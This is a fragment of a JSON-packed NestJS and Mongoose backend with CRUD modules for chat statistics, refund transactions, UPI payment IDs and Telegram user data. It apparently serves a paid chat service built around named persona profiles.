this.statService.create(createStatDto);\r\n  }\r\n\r\n  @Get(':chatId/:profile')\r\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.findByChatIdAndProfile(chatId, profile);\r\n  }\r\n\r\n  @Put(':chatId/:profile')\r\n  async update(\r\n    @Param('chatId') chatId: string,\r\n    @Param('profile') profile: string,\r\n    @Body() updateStatDto: UpdateStatDto,\r\n  ) {\r\n    return this.statService.update(chatId, profile, updateStatDto);\r\n  }\r\n\r\n  @Delete(':chatId/:profile')\r\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.deleteOne(chatId, profile);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.statService.deleteAll();\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { Stat2Service } from './stat2.service';\r\nimport { Stat2Controller } from './stat2.controller';\r\nimport { StatSchema } from './stat2.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n    imports: [\r\n        initModule,\r\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\r\n    controllers: [Stat2Controller],\r\n    providers: [Stat2Service],\r\n    exports: [Stat2Service]\r\n})\r\nexport class Stat2Module { }\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type Stat2Document = Stat2 & Document;\r\n\r\n@Schema()\r\nexport class Stat2 {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  @Prop({ required: true })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  @Prop({ required: true })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  @Prop({ required: true })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  @Prop({ required: true })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  @Prop({ required: true })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  @Prop({ required: true })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  @Prop({ required: true })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  @Prop({ required: true })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  @Prop({ required: true })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  @Prop({ required: false })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  @Prop({ required: true })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  @Prop({ required: true })\r\n  profile: string;\r\n}\r\n\r\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\r\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\nimport { UpdateStatDto } from './update-stat2.dto';\r\nimport { Stat2, Stat2Document } from './stat2.schema';\r\n\r\n@Injectable()\r\nexport class Stat2Service {\r\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\r\n\r\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\r\n    const createdStat = new this.statModel(createStatDto);\r\n    return createdStat.save();\r\n  }\r\n\r\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\r\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\r\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async findAll(): Promise<Stat2[]> {\r\n    const stats = await this.statModel.find().exec();\r\n    return stats;\r\n  }\r\n\r\n  async deleteOne(chatId: string, profile: string): Promise<void> {\r\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.statModel.deleteMany({}).exec();\r\n  }\r\n}\r\n","// update-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\n\r\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\r\n","// create-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateStatDto {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  profile: string;\r\n}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { StatService } from './stat.service';\r\nimport { CreateStatDto } from './create-stat.dto';\r\nimport { UpdateStatDto } from './update-stat.dto';\r\n\r\n@ApiTags('stats')\r\n@Controller('stats')\r\nexport class StatController {\r\n  constructor(private readonly statService: StatService) {}\r\n\r\n  @Post()\r\n  async create(@Body() createStatDto: CreateStatDto) {\r\n    return this.statService.create(createStatDto);\r\n  }\r\n\r\n  @Get(':chatId/:profile')\r\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.findByChatIdAndProfile(chatId, profile);\r\n  }\r\n\r\n  @Put(':chatId/:profile')\r\n  async update(\r\n    @Param('chatId') chatId: string,\r\n    @Param('profile') profile: string,\r\n    @Body() updateStatDto: UpdateStatDto,\r\n  ) {\r\n    return this.statService.update(chatId, profile, updateStatDto);\r\n  }\r\n\r\n  @Delete(':chatId/:profile')\r\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.deleteOne(chatId, profile);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.statService.deleteAll();\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { StatService } from './stat.service';\r\nimport { StatController } from './stat.controller';\r\nimport { StatSchema } from './stat.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n    imports: [\r\n        initModule,\r\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\r\n    controllers: [StatController],\r\n    providers: [StatService],\r\n    exports:[StatService]\r\n})\r\nexport class StatModule { }\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type StatDocument = Stat & Document;\r\n\r\n@Schema()\r\nexport class Stat {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  @Prop({ required: true })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  @Prop({ required: true })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  @Prop({ required: true })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  @Prop({ required: true })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  @Prop({ required: true })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  @Prop({ required: true })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  @Prop({ required: true })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  @Prop({ required: true })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  @Prop({ required: true })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  @Prop({ required: false })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  @Prop({ required: true })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  @Prop({ required: true })\r\n  profile: string;\r\n}\r\n\r\nexport const StatSchema = SchemaFactory.createForClass(Stat);\r\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateStatDto } from './create-stat.dto';\r\nimport { UpdateStatDto } from './update-stat.dto';\r\nimport { Stat, StatDocument } from './stat.schema';\r\n\r\n@Injectable()\r\nexport class StatService {\r\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\r\n\r\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\r\n    const createdStat = new this.statModel(createStatDto);\r\n    return createdStat.save();\r\n  }\r\n\r\n  async findAll(): Promise<Stat[]> {\r\n    const stats = await this.statModel.find().exec();\r\n    return stats;\r\n  }\r\n\r\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\r\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\r\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async deleteOne(chatId: string, profile: string): Promise<void> {\r\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.statModel.deleteMany({}).exec();\r\n  }\r\n}\r\n","// update-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateStatDto } from './create-stat.dto';\r\n\r\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateTransactionDto {\r\n  @ApiProperty({ description: 'Unique transaction ID (UTR).' })\r\n  transactionId: string;\r\n\r\n  @ApiProperty({ description: 'Amount involved in the transaction.' })\r\n  amount: number;\r\n\r\n  @ApiProperty({ description: 'Issue type reported by the user.' })\r\n  issue: string;\r\n  \r\n  @ApiProperty({ description: 'Description of issue reported by the user.' })\r\n  description: string;\r\n\r\n  @ApiProperty({ description: 'Refund method selected by the user.' })\r\n  refundMethod: string;\r\n\r\n  @ApiProperty({ description: 'User profile ID.' })\r\n  profile: string;\r\n\r\n  @ApiProperty({ description: 'User chat ID.' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'IP address of the user.' })\r\n  ip: string;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateTransactionDto } from './create-transaction.dto';\r\n\r\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\n@Schema({ timestamps: true })\r\nexport class Transaction extends Document {\r\n  @Prop({ required: false })\r\n  transactionId: string;\r\n\r\n  @Prop({ required: false })\r\n  amount: number;\r\n\r\n  @Prop({ required: false })\r\n  issue: string;\r\n\r\n  @Prop({ required: false })\r\n  description: string;\r\n\r\n  @Prop()\r\n  refundMethod: string;\r\n\r\n  @Prop({ required: false })\r\n  profile: string;\r\n\r\n  @Prop({ required: false })\r\n  chatId: string;\r\n\r\n  @Prop({ required: false })\r\n  ipAddress: string;\r\n}\r\n\r\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\r\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';\r\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\r\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\r\nimport { TransactionService } from './transaction.service';\r\n\r\n@ApiTags('Transactions')\r\n@Controller('transactions')\r\nexport class TransactionController {\r\n  constructor(private readonly transactionService: TransactionService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new transaction' })\r\n  @ApiResponse({ status: 201, description: 'Transaction created successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input.' })\r\n  async create(@Body() createTransactionDto: CreateTransactionDto) {\r\n    return this.transactionService.create(createTransactionDto);\r\n  }\r\n\r\n  @Get(':id')\r\n  @ApiOperation({ summary: 'Get transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction retrieved successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async findOne(@Param('id') id: string) {\r\n    return this.transactionService.findOne(id);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all transactions or search transactions' })\r\n  @ApiResponse({ status: 200, description: 'Transactions retrieved successfully.' })\r\n  async findAll(\r\n    @Query('search') search?: string,\r\n    @Query('limit') limit?: number,\r\n    @Query('offset') offset?: number,\r\n  ) {\r\n    return this.transactionService.findAll(search, limit, offset);\r\n  }\r\n\r\n  @Put(':id')\r\n  @ApiOperation({ summary: 'Update a transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction updated successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async update(\r\n    @Param('id') id: string,\r\n    @Body() updateTransactionDto: UpdateTransactionDto,\r\n  ) {\r\n    return this.transactionService.update(id, updateTransactionDto);\r\n  }\r\n\r\n  @Delete(':id')\r\n  @ApiOperation({ summary: 'Delete a transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction deleted successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async delete(@Param('id') id: string) {\r\n    return this.transactionService.delete(id);\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { TransactionService } from './transaction.service';\r\nimport { TransactionController } from './transaction.controller';\r\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\r\n\r\n@Module({\r\n  imports: [\r\n    MongooseModule.forFeature([\r\n      { name: Transaction.name, schema: TransactionSchema },\r\n    ]),\r\n  ],\r\n  controllers: [TransactionController],\r\n  providers: [TransactionService],\r\n  exports:[TransactionService]\r\n})\r\nexport class TransactionModule {}\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\r\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\r\nimport { Transaction } from './schemas/transaction.schema';\r\n\r\n@Injectable()\r\nexport class TransactionService {\r\n  constructor(\r\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<Transaction>,\r\n  ) {}\r\n\r\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\r\n    const newTransaction = new this.transactionModel(createTransactionDto);\r\n    return await newTransaction.save();\r\n  }\r\n\r\n  async findOne(id: string): Promise<Transaction> {\r\n    const transaction = await this.transactionModel.findById(id).exec();\r\n    if (!transaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return transaction;\r\n  }\r\n\r\n  async findAll(\r\n    search?: string,\r\n    limit = 10,\r\n    offset = 0,\r\n  ): Promise<{ transactions: Transaction[]; total: number }> {\r\n    const query = search\r\n      ? {\r\n          $or: [\r\n            { transactionId: { $regex: search, $options: 'i' } },\r\n            { issue: { $regex: search, $options: 'i' } },\r\n            { profile: { $regex: search, $options: 'i' } },\r\n            { chatId: { $regex: search, $options: 'i' } },\r\n          ],\r\n        }\r\n      : {};\r\n\r\n    const transactions = await this.transactionModel\r\n      .find(query)\r\n      .skip(offset)\r\n      .limit(limit)\r\n      .exec();\r\n    const total = await this.transactionModel.countDocuments(query).exec();\r\n\r\n    return { transactions, total };\r\n  }\r\n\r\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\r\n    const updatedTransaction = await this.transactionModel\r\n      .findByIdAndUpdate(id, updateTransactionDto, { new: true })\r\n      .exec();\r\n    if (!updatedTransaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return updatedTransaction;\r\n  }\r\n\r\n  async delete(id: string): Promise<Transaction> {\r\n    const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\r\n    if (!deletedTransaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return deletedTransaction;\r\n  }\r\n}\r\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { UpiIdService } from './upi-ids.service';\r\n\r\n@ApiTags('UPI Ids')\r\n@Controller('upi-ids')\r\nexport class UpiIdController {\r\n  constructor(private readonly UpiIdService: UpiIdService) { }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get Upi Ids' })\r\n  async findOne(): Promise<any> {\r\n    return this.UpiIdService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update Upi Ids' })\r\n  @ApiBody({ type: Object })\r\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\r\n    return this.UpiIdService.update(updateUpiIdsdto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UpiIdService } from './upi-ids.service';\r\nimport { UpiIdController } from './upi-ids.controller';\r\nimport { UpiIdSchema } from './upi-ids.schema';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    UpiIdModule,\r\n    NpointModule,\r\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\r\n  ],\r\n  providers: [UpiIdService],\r\n  controllers: [UpiIdController],\r\n  exports: [UpiIdService],\r\n})\r\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type UpiIdDocument = UpiId & Document;\r\n\r\n@Schema({\r\n  versionKey: false, autoIndex: true, strict: false, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class UpiId { }\r\n\r\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\r\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { UpiId } from './upi-ids.schema';\r\nimport axios from 'axios';\r\nimport { areJsonsNotSame, mapToJson } from '../../utils';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class UpiIdService {\r\n    private upiIds = {}\r\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\r\n        private npointSerive: NpointService\r\n    ) {\r\n        this.UpiIdModel.findOne({}).exec().then((data) => {\r\n            this.upiIds = data;\r\n            console.log(\"Refreshed UPIs\")\r\n        })\r\n        setInterval(async () => {\r\n            await this.refreshUPIs();\r\n            await this.checkNpoint();\r\n        }, 5 * 60 * 1000);\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async refreshUPIs() {\r\n        console.log(\"Refreshed UPIs\")\r\n        this.upiIds = await this.UpiIdModel.findOne({}).exec();\r\n    }\r\n\r\n    async checkNpoint() {\r\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\r\n        const existingUpiIds = await this.findOne();\r\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\r\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", this.upiIds)\r\n        }\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        if (Object.keys(this.upiIds).length > 0) {\r\n            return this.upiIds\r\n        }\r\n        const result = await this.UpiIdModel.findOne({}).exec();\r\n        this.upiIds = result\r\n        console.log(\"Refreshed UPIs\")\r\n        return result\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        this.upiIds = updatedUser;\r\n        console.log(\"Refreshed UPIs\")\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`UpiIdModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateUserDataDto {\r\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\r\n    chatId: string;\r\n\r\n    @ApiProperty({ example: 1, description: 'Total count' })\r\n    totalCount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Picture count' })\r\n    picCount: number;\r\n\r\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\r\n    lastMsgTimeStamp: number;\r\n\r\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\r\n    limitTime: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Paid count' })\r\n    paidCount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Profile count' })\r\n    prfCount: number;\r\n\r\n    @ApiProperty({ example: 1, description: 'Can reply' })\r\n    canReply: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Pay amount' })\r\n    payAmount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\r\n    highestPayAmount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\r\n    cheatCount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\r\n    callTime: number;\r\n\r\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\r\n    username: string;\r\n\r\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\r\n    accessHash: string;\r\n\r\n    @ApiProperty({ example: true, description: 'Paid reply status' })\r\n    paidReply: boolean;\r\n\r\n    @ApiProperty({ example: false, description: 'Demo given status' })\r\n    demoGiven: boolean;\r\n\r\n    @ApiProperty({ example: false, description: 'Second show status' })\r\n    secondShow: boolean;\r\n\r\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\r\n    profile: string;\r\n\r\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\r\n    picsSent: boolean;\r\n\r\n    @ApiProperty({ example: [], description: 'videos' })\r\n    videos: number[];\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams } from 'class-transformer';\r\n\r\nexport class SearchDto {\r\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\r\n  totalCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\r\n  picCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\r\n  lastMsgTimeStamp?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\r\n  limitTime?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\r\n  paidCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\r\n  prfCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\r\n  canReply?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\r\n  payAmount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Username' })\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Access hash' })\r\n  accessHash?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\r\n  paidReply?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\r\n  demoGiven?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\r\n  secondShow?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Profile name' })\r\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n  profile?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Chat ID' })\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\r\n  picsSent?: boolean;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateUserDataDto } from './create-user-data.dto';\r\n\r\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type UserDataDocument = UserData & Document;\r\n\r\n@Schema({\r\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class UserData {\r\n    @Prop({ required: true })\r\n    chatId: string;\r\n\r\n    @Prop({ required: true })\r\n    totalCount: number;\r\n\r\n    @Prop({ required: true })\r\n    picCount: number;\r\n\r\n    @Prop({ required: true })\r\n    lastMsgTimeStamp: number;\r\n\r\n    @Prop({ required: true })\r\n    limitTime: number;\r\n\r\n    @Prop({ required: true })\r\n    paidCount: number;\r\n\r\n    @Prop({ required: true })\r\n    prfCount: number;\r\n\r\n    @Prop({ required: true })\r\n    canReply: number;\r\n\r\n    @Prop({ required: true })\r\n    payAmount: number;\r\n\r\n    @Prop({ required: true })\r\n    username: string;\r\n\r\n    @Prop({ required: true })\r\n    accessHash: string;\r\n\r\n    @Prop({ required: true })\r\n    paidReply: boolean;\r\n\r\n    @Prop({ required: true })\r\n    demoGiven: boolean;\r\n\r\n    @Prop({ required: true })\r\n    secondShow: boolean;\r\n\r\n    @Prop({ required: true, default: 0 })\r\n    fullShow: number;\r\n\r\n    @Prop({ required: true })\r\n    profile: string;\r\n\r\n    @Prop({ required: true })\r\n    picSent: boolean;\r\n\r\n    @Prop({ required: true })\r\n    highestPayAmount: number;\r\n\r\n    @Prop({ required: true })\r\n    cheatCount: number;\r\n\r\n    @Prop({ required: true })\r\n    callTime: number;\r\n\r\n    @Prop({ required: false, default:[] })\r\n    videos: number[];\r\n}\r\n\r\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\r\nimport { UserDataService } from './user-data.service';\r\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\r\nimport { UserData } from './schemas/user-data.schema';\r\nimport { SearchDto } from './dto/search-user-data.dto';\r\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\r\n\r\n@ApiTags('UserData of TG clients')\r\n@Controller('userData')\r\nexport class UserDataController {\r\n  constructor(private readonly userDataService: UserDataService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\r\n    return this.userDataService.create(createUserDataDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\r\n    return this.userDataService.search(query);\r\n  }\r\n\r\n  